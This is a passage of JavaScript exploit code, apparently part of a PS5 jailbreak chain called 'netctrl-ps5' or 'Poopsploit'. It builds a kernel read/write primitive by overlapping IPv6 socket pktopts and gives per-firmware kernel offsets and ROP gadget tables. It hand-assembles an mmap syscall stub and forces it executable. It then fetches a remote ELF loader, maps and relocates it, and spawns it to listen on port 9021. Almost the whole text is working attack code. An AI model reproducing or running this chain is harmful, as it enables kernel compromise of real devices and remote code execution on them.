     * We already hold arbitrary kernel R/W (KRW.r64/w64), curproc, the fd table
     * (ST.fdt_ofiles) — enough to build it, mirroring lapse make_kernel_arw.
     * Returns { rwpipe:[r,w], rwpair:[a,b], kpipeAddr:BigInt }. */
    function buildLapseKRW() {
        // socket / ipv6 constants
        const AF_INET6 = 28;
        const SOCK_DGRAM = 2;
        const IPPROTO_UDP = 17;
        const IPPROTO_IPV6 = 41;
        const IPV6_PKTINFO = 46;
        const PKTINFO_LEN = 0x14;
        // struct offsets — CONFIRMED on 10.00 from ip6_ctloutput (pass survey):
        //   socket+0x18 = so_pcb ; inpcb+0x120 = in6p_outputopts ;
        //   pktopts+0x10 = ip6po_pktinfo ; file+0 = f_data ; fde stride 0x30
        const SO_PCB = 0x18n, IN6P_OUTPUTOPTS = 0x120n, IP6PO_PKTINFO = 0x10n;
        const FDE = 0x30n;
        const fde = (fd) => ST.fdt_ofiles + BigInt(fd) * FDE;

        // create the KRW pipe + the two IPv6 sockets (need return values, so
        // these are individual calls; everything after moves memory via the
        // direct KRW primitive, not per-call ROP)
        const pbuf = mem.alloc(8);
        if (sys.pipe(pbuf) !== 0) throw new Error("lapse: pipe2 failed");
        const rwpipe = [rd32at(pbuf, 0) | 0, rd32at(pbuf, 4) | 0];
        const master = sys.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP) | 0;
        const victim = sys.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP) | 0;
        if (master < 0 || victim < 0) throw new Error("lapse: socket failed");

        // allocate each socket's ip6_pktopts by setting PKTINFO once (batched)
        const pk = mem.alloc(PKTINFO_LEN); mem.bset(pk, PKTINFO_LEN, 0);
        window.rop_worker.syscallBatch([
            [Number(SYSCALL_NUMS.setsockopt), S(master), S(IPPROTO_IPV6), S(IPV6_PKTINFO), BigInt(pk), S(PKTINFO_LEN)],
            [Number(SYSCALL_NUMS.setsockopt), S(victim), S(IPPROTO_IPV6), S(IPV6_PKTINFO), BigInt(pk), S(PKTINFO_LEN)],
        ]);

        // walk fd table to each socket's pktopts, overlap, and read the pipe addr
        return _lapseFinish(rwpipe, master, victim, SO_PCB, IN6P_OUTPUTOPTS, IP6PO_PKTINFO, fde);
    }

    // separated so the pointer chase reads clearly (each hop is one KRW read)
    function _lapseFinish(rwpipe, master, victim, SO_PCB, IN6P_OUTPUTOPTS, IP6PO_PKTINFO, fde) {
        const pktopts = (fd) => {
            const file = KRW.r64(fde(fd));            // fde -> struct file
            const sock = KRW.r64(file);               // file+0 = f_data = socket
            const pcb  = KRW.r64(sock + SO_PCB);      // socket+0x18 = so_pcb
            return KRW.r64(pcb + IN6P_OUTPUTOPTS);    // inpcb+0x120 = pktopts
        };
        const mPkt = pktopts(master), vPkt = pktopts(victim);
        // overlap: master.ip6po_pktinfo := &victim.ip6po_pktinfo, so a setsockopt
        // on master aims victim's pktinfo pointer and victim r/w's that address.
        KRW.w64(mPkt + IP6PO_PKTINFO, vPkt + IP6PO_PKTINFO);

        // kpipe_addr = kernel struct pipe (rwpipe[0]'s file f_data)
        const pfile = KRW.r64(fde(rwpipe[0]));
        const kpipeAddr = KRW.r64(pfile);

        beacon("lapse rwpipe=" + rwpipe.join("/") + " rwpair=" + master + "/" + victim
               + " kpipe=" + hex(kpipeAddr));
        return { rwpipe, rwpair: [master, victim], kpipeAddr };
    }

    /* kdata_base for payload_args+0x20: elfldr keys per-fw kernel offsets off it
     * (sub_6820 switch). It is the kernel image anchor its deltas are relative
     * to (e.g. unk_5CB50 = kdata_base - 0xCC0000). Derive from a kernel symbol
     * we already resolve at runtime (ST.allproc) minus that symbol's static RVA
     * in x86_kernel_1000.elf. NOT YET WIRED — needs the allproc RVA + confirming
     * elfldr's anchor == that base for the 10.00 sdk case. */
    /* allproc's distance from kdata_base, per firmware.
     *
     * This used to be a single 10.00 constant, which silently produced a wrong
     * kdata_base on every other firmware — and wrong is worse than missing here,
     * because elfldr keys ALL of its own kernel offsets off this value, so a bad
     * anchor means it writes to the wrong kernel addresses rather than failing.
     *
     * The values are not re-derived guesses: they are read straight out of
     * elfldr-ps5.elf's own firmware switch (sub_6820), which for each firmware
     * does `allproc = kdata_base + delta`. Taking elfldr's own numbers is what
     * makes this correct by construction — we are computing the input to a
     * function whose behaviour we are reading.
     *
     * Cross-checked twice against ps5_kernel_collection, since reading the right
     * constant out of the wrong branch would be invisible otherwise:
     *   1. elfldr's first store is `kdata_base - N`, and N equals the kernel
     *      ELF's text PT_LOAD size on all 20 kernels in the 9.00-12.00 window
     *      (9.x 0xCA0000, 10.x 0xCC0000, 11.x 0xD30000, 12.x 0xD50000) — so
     *      kdata_base is text_base + text_size, exactly as the 10.00 note said.
     *   2. Locating sx_init(&allproc_lock, "allproc") in each of those kernels
     *      puts allproc_lock at kdata_base + delta - 0x20 on every single one —
     *      a uniform sizeof(struct sx), with allproc immediately after it.
     * Both checks agree for all 20 kernels, so the grouping below is the real
     * build grouping and not an artifact of which branch I happened to read. */
    const ALLPROC_TO_KDATA = {
        "09.00": 0X2755D50n,
        "09.20": 0X2755D50n,
        "09.40": 0X2755D50n,
        "09.60": 0X2755D50n,
        "10.00": 0X2765D70n,
        "10.01": 0X2765D70n,
        "10.20": 0X2765D70n,
        "10.40": 0X2765D70n,
        "10.60": 0X2765D70n,
        "11.00": 0X2875D70n,
        "11.20": 0X2875D70n,
        "11.40": 0X2875D70n,
        "11.60": 0X2875D70n,
        "12.00": 0X2885E00n,
        "12.02": 0X2885E00n,
        "12.20": 0X2885E00n,
        "12.40": 0X2885E00n,
        "12.60": 0X2885E00n,
        "12.70": 0X2885E00n,
    };

    function computeKdataBase() {
        const fwv = String((window.slopkit && window.slopkit.FW_VERSION) || "");
        const delta = ALLPROC_TO_KDATA[fwv];
        if (delta === undefined)
            throw new Error("computeKdataBase: no allproc->kdata delta for FW '"
                            + fwv + "' — elfldr would be handed a bogus "
                            + "kdata_base and patch the wrong kernel addresses");
        if (!ST.allproc) throw new Error("computeKdataBase: ST.allproc unset");
        return BigInt(ST.allproc) - delta;
    }

    /* ---- executable memory for elfldr, the way the system already allows ----
     *
     * Previously this mapped one RW region and then FORCED execute on it by
     * patching the vm_map_entry's protection/max_protection through kernel
     * write, then mprotect'ing. That works, but it means kernel-patching a
     * ~400 KB mapping to get W^X-violating RWX — the single riskiest write in
     * the whole chain, and one that has to be right on four different kernel
     * layouts.
     *
     * PS5 has a sanctioned mechanism for exactly this, and umtx2 uses it:
     * jitshm. `jitshm_create` returns a handle to executable shared memory;
     * `jitshm_alias` returns a second handle to the SAME physical pages with
     * different protections. Map the first PROT_READ|EXEC and the second
     * PROT_READ|WRITE, write code through the writable alias, execute it from
     * the executable one. No page is ever W and X at once, so nothing has to be
     * forced and no kernel protection bits are touched for the image at all.
     *
     * jitshm_create (3 args) and jitshm_alias (2 args) are plain ROP calls.
     * Only mmap needs the native stub, because it takes six arguments and r9 is
     * unreachable — re-verified across both modules on every firmware (pop r9,
     * xor r9/r9, mov r9,<reg>, mov r9d/imm forms, and variants with extra pops
     * before the ret): zero usable hits. So the bootstrap stub stays, but it is
     * now the ONLY thing force_exec touches — one arena page instead of the
     * whole payload image. */
    /* libkernel_web exports the elfldr loader needs, per firmware.
     *
     * Resolved from each module's own dynamic symbol table by NID, not guessed:
     * PS5 exports are named by NID (sha1-derived, e.g. pthread_create is
     * "OxhIB8LB-PQ"), so looking the NID up in DT_SYMTAB/DT_STRTAB gives the
     * exact st_value for that build. Every one below was checked to land on a
     * real function prologue (`push rbp; mov rbp, rsp; ...`).
     *
     * pthread_join is resolved but intentionally unused — see the spawn site. */
    const LIBKERNEL_FN = {
        "09.00": { pthread_create: 0X208C0n, pthread_join: 0X220A0n },
        "09.20": { pthread_create: 0X208C0n, pthread_join: 0X220A0n },
        "09.40": { pthread_create: 0X208C0n, pthread_join: 0X220A0n },
        "09.60": { pthread_create: 0X208C0n, pthread_join: 0X220A0n },
        "10.00": { pthread_create: 0X20780n, pthread_join: 0X21F40n },
        "10.01": { pthread_create: 0X20780n, pthread_join: 0X21F40n },
        "10.20": { pthread_create: 0X20780n, pthread_join: 0X21F40n },
        "10.40": { pthread_create: 0X20780n, pthread_join: 0X21F40n },
        "10.60": { pthread_create: 0X20780n, pthread_join: 0X21F40n },
        "11.00": { pthread_create: 0X20B50n, pthread_join: 0X22310n },
        "11.20": { pthread_create: 0X20B50n, pthread_join: 0X22310n },
        "11.40": { pthread_create: 0X20B50n, pthread_join: 0X22310n },
        "11.60": { pthread_create: 0X20B50n, pthread_join: 0X22310n },
        "12.00": { pthread_create: 0X21150n, pthread_join: 0X22910n },
        "12.02": { pthread_create: 0X21150n, pthread_join: 0X22910n },
        "12.20": { pthread_create: 0X21150n, pthread_join: 0X22910n },
        "12.40": { pthread_create: 0X21170n, pthread_join: 0X22930n },
        "12.60": { pthread_create: 0X21170n, pthread_join: 0X22930n },
        "12.70": { pthread_create: 0X21170n, pthread_join: 0X22930n },
    };

    function libkernelFn(name) {
        const sk = window.slopkit || {};
        const t = LIBKERNEL_FN[String(sk.FW_VERSION || "")];
        if (!t || t[name] === undefined)
            throw new Error("elfldr: no " + name + " offset for FW "
                            + (sk.FW_VERSION || "?"));
        return BigInt(sk.kernelBase) + t[name];
    }

    const SYS_JITSHM_CREATE = 533, SYS_JITSHM_ALIAS = 534;   // both kernels 9.00-12.00
    const PROT_RW = 3, PROT_RX = 5, PROT_RWX = 7;
    const MAP_SHARED_FIXED = 0x11;          // MAP_SHARED | MAP_FIXED
    const MAP_ANON_PRIV_FIXED = 0x1012;     // MAP_ANON | MAP_PRIVATE | MAP_FIXED

    const le8 = (v) => {
        const a = []; let x = BigInt(v);
        for (let i = 0; i < 8; i++) { a.push(Number(x & 0xffn)); x >>= 8n; }
        return a;
    };

    /* One reusable native mmap trampoline, built and made executable ONCE.
     * Reads all six arguments from a parameter block so a single stub serves
     * every mapping; the old code emitted a fresh stub with immediates baked in
     * per call, which meant a force_exec per mapping. */
    let mmapStub = 0n, mmapParams = 0n;
    function ensureMmapStub() {
        if (mmapStub) return;
        const scratch = mem.alloc(0x100);
        mmapStub = BigInt(scratch);
        mmapParams = mmapStub + 0x80n;      // 7 qwords: 6 args + result
        const code = [].concat(
            [0x53],                          // push rbx
            [0x48, 0x89, 0xFB],              // mov rbx, rdi   (rdi = param block)
            [0x48, 0x8B, 0x3B],              // mov rdi, [rbx+0x00]   addr
            [0x48, 0x8B, 0x73, 0x08],        // mov rsi, [rbx+0x08]   len
            [0x48, 0x8B, 0x53, 0x10],        // mov rdx, [rbx+0x10]   prot
            [0x4C, 0x8B, 0x53, 0x18],        // mov r10, [rbx+0x18]   flags
            [0x4C, 0x8B, 0x43, 0x20],        // mov r8,  [rbx+0x20]   fd
            [0x4C, 0x8B, 0x4B, 0x28],        // mov r9,  [rbx+0x28]   offset
            [0xB8, 477 & 0xff, (477 >> 8) & 0xff, 0x00, 0x00],  // mov eax, 477
            [0x0F, 0x05],                    // syscall
            [0x48, 0x89, 0x43, 0x30],        // mov [rbx+0x30], rax   result
            [0x5B],                          // pop rbx
            [0xC3]                           // ret
        );
        for (let i = 0; i < code.length; i++) R.wr8(mmapStub, i, code[i]);

        // The one and only force_exec: a single arena page holding this stub.
        if (!force_exec(mmapStub)) throw new Error("mmap stub: force_exec failed");
        const page = mmapStub & ~(BigInt(PAGE_SIZE) - 1n);
        const mp = invoke("mprotect", page, S(2 * PAGE_SIZE), S(PROT_RWX));
        if (mp !== 0) throw new Error("mmap stub: mprotect -> " + mp);
        beacon("mmap stub armed @" + hex(mmapStub));
    }

    function nativeMmap(addr, len, prot, flags, fd, off) {
        ensureMmapStub();
        // mmapParams is already a BigInt (mem.alloc -> rop-worker's bump
        // allocator returns W.stack + bump); wr64at BigInt()s both operands, so
        // pass it straight through rather than round-tripping via Number.
        wr64at(mmapParams, 0x00, BigInt(addr));
        wr64at(mmapParams, 0x08, BigInt(len));
        wr64at(mmapParams, 0x10, BigInt(prot));
        wr64at(mmapParams, 0x18, BigInt(flags));
        wr64at(mmapParams, 0x20, BigInt(fd));
        wr64at(mmapParams, 0x28, BigInt(off));
        R.wr64(mmapParams + 0x30n, 0n);
        window.rop_worker.fireSync((c) => c.pop("rdi", mmapParams).call(mmapStub));
        return R.rd64(mmapParams + 0x30n);
    }

    /* Executable mapping + writable alias of the same pages, at a fixed base. */
    function jitshmPair(base, shadow, len) {
        const execH = invoke("jitshm_create", 0n, S(len), S(PROT_RWX)) | 0;
        if (execH < 0) throw new Error("jitshm_create -> " + execH);
        const writeH = invoke("jitshm_alias", S(execH), S(PROT_RW)) | 0;
        if (writeH < 0) throw new Error("jitshm_alias -> " + writeH);

        const x = nativeMmap(base, len, PROT_RX, MAP_SHARED_FIXED, execH, 0);
        const w = nativeMmap(shadow, len, PROT_RW, MAP_SHARED_FIXED, writeH, 0);
        beacon("jitshm exec=" + hex(x) + " write=" + hex(w)
               + " len=0x" + len.toString(16) + " h=" + execH + "/" + writeH);
        if ((x & 0xfffn) !== 0n || x === 0xFFFFFFFFFFFFFFFFn)
            throw new Error("jitshm exec map failed: " + hex(x));
        if ((w & 0xfffn) !== 0n || w === 0xFFFFFFFFFFFFFFFFn)
            throw new Error("jitshm write map failed: " + hex(w));
        return { exec: x, write: w };
    }

    function loadElfldr() {
        const buf = fetchBytes(ELFLDR_URL);
        beacon("elfldr fetched " + buf.length + "B");
        const u16 = (o) => (buf[o] | (buf[o + 1] << 8)) & 0xffff;
        const u32 = (o) => (buf[o] | (buf[o + 1] << 8) | (buf[o + 2] << 16) | (buf[o + 3] << 24)) >>> 0;
        const u64 = (o) => BigInt(u32(o)) | (BigInt(u32(o + 4)) << 32n);
        if (!(buf[0] === 0x7f && buf[1] === 0x45 && buf[2] === 0x4c && buf[3] === 0x46))
            throw new Error("elfldr: bad ELF magic");

        const e_entry = Number(u64(0x18));
        const e_phoff = Number(u64(0x20));
        const e_phnum = u16(0x38);

        // walk program headers: collect LOAD segs + the DYNAMIC vaddr + span
        let maxva = 0, dynva = 0;
        const loads = [];
        for (let i = 0; i < e_phnum; i++) {
            const o = e_phoff + i * 0x38;
            const pt = u32(o);
            const pflags = u32(o + 4);      // needed to tell text from data
            const poff = Number(u64(o + 8)), pva = Number(u64(o + 0x10));
            const pfsz = Number(u64(o + 0x20)), pmsz = Number(u64(o + 0x28));
            if (pt === 1) { loads.push({ poff, pva, pfsz, pmsz, pflags }); if (pva + pmsz > maxva) maxva = pva + pmsz; }
            else if (pt === 2) dynva = pva;
        }
        const v2o = (va) => {                       // image vaddr -> file offset
            for (const s of loads) if (va >= s.pva && va < s.pva + s.pfsz) return s.poff + (va - s.pva);
            throw new Error("elfldr: vaddr 0x" + va.toString(16) + " not in a LOAD seg");
        };

        /* Map the image the way umtx2 does: the executable segment gets a
         * jitshm exec mapping plus a writable alias of the same pages, and the
         * data segments get ordinary anonymous RW memory. Everything is
         * MAP_FIXED at a chosen base so segment vaddrs keep their relative
         * layout — which is required, because the relocations and all the
         * image's internal references assume it.
         *
         * The important consequence: elfldr's text is never writable and its
         * data is never executable, so no page violates W^X and no kernel
         * protection bits are patched for the image at all. Writes to text
         * (segment copy and relocations landing in it) are redirected through
         * the alias.
         *
         * elfldr's own LOAD0 is flagged RWX (0x7) rather than RX, so key the
         * exec/data split on PF_X rather than on an exact flag match. */
        const PF_X = 1;
        const span = (maxva + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
        const IMAGE_BASE  = 0x0000000926100000n;   // fixed, as umtx2 does
        const SHADOW_BASE = 0x0000000920100000n;   // writable alias of the text

        let textEnd = 0, shadow = 0n;
        for (const s of loads) {
            const alen = (s.pmsz + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
            if (s.pflags & PF_X) {
                const pair = jitshmPair(IMAGE_BASE + BigInt(s.pva), SHADOW_BASE, alen);
                shadow = pair.write;
                textEnd = s.pva + s.pmsz;
            } else {
                // fd as an explicit unsigned 64-bit -1: wr64at BigInt()s the
                // value straight into memory, and a negative BigInt there is
                // not what the stub's `mov r8, [rbx+0x20]` should read.
                const got = nativeMmap(IMAGE_BASE + BigInt(s.pva), alen,
                                       PROT_RW, MAP_ANON_PRIV_FIXED,
                                       0xFFFFFFFFFFFFFFFFn, 0);
                if (got === 0xFFFFFFFFFFFFFFFFn)
                    throw new Error("elfldr: data mmap failed at vaddr 0x"
                                    + s.pva.toString(16));
            }
        }
        const base = IMAGE_BASE;
        if (!shadow) throw new Error("elfldr: no executable LOAD segment found");
        beacon("elfldr base=" + hex(base) + " span=0x" + span.toString(16)
               + " shadow=" + hex(shadow) + " textEnd=0x" + textEnd.toString(16));

        /* Where a write for image offset `va` must actually go: inside the text
         * segment it has to go through the writable alias, because the exec
         * mapping is not writable. */
        const wdst = (va) => (va < textEnd) ? shadow + BigInt(va)
                                            : base + BigInt(va);

        // copy LOAD segments, zero the bss tail
        for (const s of loads) {
            const dst = wdst(s.pva);
            writeBytes(dst, buf, s.poff, s.pfsz);
            for (let j = s.pfsz; j < s.pmsz; j++) R.wr8(dst, j, 0);
        }
        beacon("elfldr segs copied (" + loads.length + ")");

        // apply R_X86_64_RELATIVE relocations from DYNAMIC (mirrors umtx2 loader)
        let relaOff = 0, relaSz = 0, relaEnt = 24;
        for (let o = v2o(dynva); ; o += 16) {
            const tag = Number(u64(o)), val = Number(u64(o + 8));
            if (tag === 0) break;
            if (tag === 7) relaOff = val;            // DT_RELA (vaddr)
            else if (tag === 8) relaSz = val;        // DT_RELASZ
            else if (tag === 9) relaEnt = val;       // DT_RELAENT
        }
        let nrel = 0;
        for (let i = 0; i < relaSz / relaEnt; i++) {
            const ro = v2o(relaOff + i * relaEnt);
            const r_offset = u64(ro), r_info = u64(ro + 8), r_addend = u64(ro + 16);
            if (Number(r_info & 0xffffffffn) === R_X86_64_RELATIVE) {
                /* The VALUE is always relative to the real image base, but the
                 * WRITE has to go through the alias when the target lands in
                 * the text segment — that mapping is execute-only-ish (RX) and
                 * a direct store would fault. */
                R.wr64(wdst(Number(r_offset)), base + r_addend);
                nrel++;
            }
        }
        beacon("elfldr relocs applied=" + nrel);

        // No protection fixup needed: the exec mapping was created executable
        // by jitshm and never had to be forced.

        // native dlsym stub: mov r10,rcx; mov eax,0x24F; syscall; ret
        const stub = mem.alloc(0x20);
        const sb = [0x49, 0x89, 0xCA, 0xB8, SYS_DYNLIB_DLSYM & 0xff,
                    (SYS_DYNLIB_DLSYM >> 8) & 0xff, 0, 0, 0x0F, 0x05, 0xC3];
        for (let i = 0; i < sb.length; i++) R.wr8(stub, i, sb[i]);

        // KRW primitive elfldr expects (lapse) + kdata_base — the two deps
        const krw = buildLapseKRW();
        const kdataBase = computeKdataBase();

        // payload_args_t
        const rwpipe = mem.alloc(8);  wr32at(rwpipe, 0, krw.rwpipe[0]); wr32at(rwpipe, 4, krw.rwpipe[1]);
        const rwpair = mem.alloc(8);  wr32at(rwpair, 0, krw.rwpair[0]); wr32at(rwpair, 4, krw.rwpair[1]);
        const payloadout = mem.alloc(8); R.wr64(BigInt(payloadout), 0n);
        const args = mem.alloc(0x30);
        wr64at(args, 0x00, BigInt(stub));
        wr64at(args, 0x08, BigInt(rwpipe));
        wr64at(args, 0x10, BigInt(rwpair));
        wr64at(args, 0x18, krw.kpipeAddr);
        wr64at(args, 0x20, kdataBase);
        wr64at(args, 0x28, BigInt(payloadout));

        /* Spawn elfldr with libkernel's pthread_create, not raw thr_new.
         *
         * thr_new makes the CALLER build the thread: stack, and critically a
         * TCB for %fs. What we handed it was a single self-pointer, which is
         * not a TCB — no stack-guard canary, no errno slot, no dtv. Any libc
         * call inside elfldr that reads %fs (and a stack-protected function
         * reads the canary on entry) is then reading whatever follows that one
         * qword. It may survive; it is not a thread.
         *
         * pthread_create(&tid, attr=NULL, entry, arg) does all of that properly
         * and is four arguments, which our chain reaches — it is only mmap's
         * sixth argument that is out of reach. umtx2 uses the same approach
         * (pthread_create_name_np, the 5-arg named variant).
         *
         * Deliberately NOT joined. umtx2 can pthread_join because it drives ROP
         * from a chain it owns; ours runs on a hijacked WebKit worker parked in
         * cond_wait, and elfldr does not return while it is serving port 9021.
         * Joining would block that worker inside the kernel forever, which is
         * precisely the wedge state the run refuses to recover from. Poll
         * payloadout from the main thread instead — same information, no risk
         * to the worker. */
        const pthreadCreate = libkernelFn("pthread_create");
        const tid = mem.alloc(8);
        R.wr64(BigInt(tid), 0n);
        const entry = base + BigInt(e_entry);
        const prv = Number(window.rop_worker.callSync(
            pthreadCreate, BigInt(tid), 0n, entry, BigInt(args)).retval) | 0;
        beacon("elfldr pthread_create -> " + prv + " entry=" + hex(entry)
               + " tid=" + hex(R.rd64(BigInt(tid))));
        if (prv !== 0) throw new Error("elfldr: pthread_create returned " + prv);

        // elfldr writes its result into payloadout on exit
        let out = 0n;
        for (let i = 0; i < 60; i++) { out = R.rd64(BigInt(payloadout)); if (out !== 0n) break; }
        beacon("elfldr out=" + hex(out) + (out === 0n ? " (running/listening 9021)" : ""));
        // on-screen notification: elfldr is up (out==0 = still running/listening)
        sendNotification(out === 0n
            ? "Poopsploit: elfldr RUNNING - listening on port 9021"
            : "Poopsploit: elfldr exited code=0x" + out.toString(16));
        return true;
    }

    try { loadElfldr(); }
    catch (e) { beacon("elfldr: " + e.message); log("elfldr load failed: " + e.message); }

    try { sessionStorage.removeItem("netctrl_dirty"); } catch (e) {}
    beacon("phase: JAILBROKEN");
    log("done");
    return true;
}

/* Absolute gadget addresses for rop-worker, which runs chains on a Worker
 * thread instead of lapse-runtime's runChain (fatal on 10.00).
 *
 * mov_qword_rdi_rax is not in GADGETS - it comes from lapse-offsets.json, the
 * file whose setjmp/longjmp entries pointed at DATA. That one WAS checked:
 * 0x32a57 disassembles to `mov qword ptr [rdi], rax ; ret` in the devkit's own
 * libSceNKWebKit, so it is used here for 10.00 only. Other firmwares must be
 * verified the same way before being added.
 *
 * They now have been. Every firmware below carries a mov_qword_rdi_rax that was
 * disassembled out of that firmware's own retail libSceNKWebKit.sprx and
 * string-matched against `mov qword ptr [rdi], rax ; ret` - the same standard
 * 0x32A57 was held to, applied to all fourteen. Note this table exists BECAUSE
 * store() needs the gadget and GADGETS does not carry it: before this, every
 * firmware except 10.00 would build a chain with `undefined` for the store
 * gadget, so leaving the other thirteen blank was not a neutral default.
 */
const EXTRA_GADGETS = {
    "09.00": { mov_qword_rdi_rax: 0X9F1AFn, mov_rax_deref_rdi: 0XA7B6n, inc_rax: 0X35F0C9n },
    "09.20": { mov_qword_rdi_rax: 0X9F1AFn, mov_rax_deref_rdi: 0XA7B6n, inc_rax: 0X35F0A9n },
    "09.40": { mov_qword_rdi_rax: 0X9F1AFn, mov_rax_deref_rdi: 0XA7B6n, inc_rax: 0X35F0A9n },
    "09.60": { mov_qword_rdi_rax: 0X9F1AFn, mov_rax_deref_rdi: 0XA7B6n, inc_rax: 0X35F0A9n },
    "10.00": { mov_qword_rdi_rax: 0X32A57n, mov_rax_deref_rdi: 0X38806n, inc_rax: 0X3F73C9n },
    "10.01": { mov_qword_rdi_rax: 0X32A57n, mov_rax_deref_rdi: 0X38806n, inc_rax: 0X3F73C9n },
    "10.20": { mov_qword_rdi_rax: 0X32A57n, mov_rax_deref_rdi: 0X38806n, inc_rax: 0X3F73C9n },
    "10.40": { mov_qword_rdi_rax: 0X32A57n, mov_rax_deref_rdi: 0X38806n, inc_rax: 0X3F73C9n },
    "10.60": { mov_qword_rdi_rax: 0X32A57n, mov_rax_deref_rdi: 0X38806n, inc_rax: 0X3F73C9n },
    "11.00": { mov_qword_rdi_rax: 0X253An, mov_rax_deref_rdi: 0X1A566n, inc_rax: 0X4924En },
    "11.20": { mov_qword_rdi_rax: 0X253An, mov_rax_deref_rdi: 0X1A566n, inc_rax: 0X4924En },
    "11.40": { mov_qword_rdi_rax: 0X253An, mov_rax_deref_rdi: 0X1A566n, inc_rax: 0X4924En },
    "11.60": { mov_qword_rdi_rax: 0X253An, mov_rax_deref_rdi: 0X1A566n, inc_rax: 0X4924En },
    "12.00": { mov_qword_rdi_rax: 0X86197n, mov_rax_deref_rdi: 0X6BB40n, inc_rax: 0X1E6FBEn },
    "12.02": { mov_qword_rdi_rax: 0X86197n, mov_rax_deref_rdi: 0X6BB40n, inc_rax: 0X1E6FBEn },
    "12.20": { mov_qword_rdi_rax: 0X86197n, mov_rax_deref_rdi: 0X6BB40n, inc_rax: 0X1E6FBEn },
    "12.40": { mov_qword_rdi_rax: 0X86197n, mov_rax_deref_rdi: 0X6BB40n, inc_rax: 0X1E6FBEn },
    "12.60": { mov_qword_rdi_rax: 0X86197n, mov_rax_deref_rdi: 0X6BB40n, inc_rax: 0X1E6FBEn },
    "12.70": { mov_qword_rdi_rax: 0X86197n, mov_rax_deref_rdi: 0X6BB40n, inc_rax: 0X1E6FBEn },
};

function gadgetsFor(fw) {
    const t = GADGETS[fw];
    if (!t) return null;
    const sk = window.slopkit || {};
    const wk = BigInt(sk.webkitBase || 0), lk = BigInt(sk.kernelBase || 0);
    if (!wk || !lk) return null;
    const out = {};
    // syscall_wrapper is the only entry from libkernel_web; the rest are WebKit
    for (const k in t) out[k] = (k === "syscall_wrapper" ? lk : wk) + t[k];
    const ex = EXTRA_GADGETS[fw];
    for (const k in (ex || {})) out[k] = wk + ex[k];
    return out;
}

/* find_allproc / make_karw / isKernelPtr are exported for lapse-ps5.js.
 * lapse reaches kernel R/W by a completely different route (aio double free ->
 * pktopts twins), but once it has a pipe pair and a forged pipebuf the pipe
 * primitive and everything above it — allproc, the jailbreak, elfldr — is the
 * same code, so it hands off here rather than duplicating it. */
window.netctrl_ps5 = { run, ST, KRW, sys, find_twins, find_triplet,
                       ucred_triple_free, leak_kqueue, ps5_jailbreak,
                       find_allproc, isKernelPtr, mem, invoke,
                       runtimeStatus, bindRuntime, gadgetsFor,
                       SYSCALL_NUMS, version: "netctrl-ps5 1.0" };
log("loaded — netctrl_ps5.runtimeStatus() to check, .run() to go");

})();
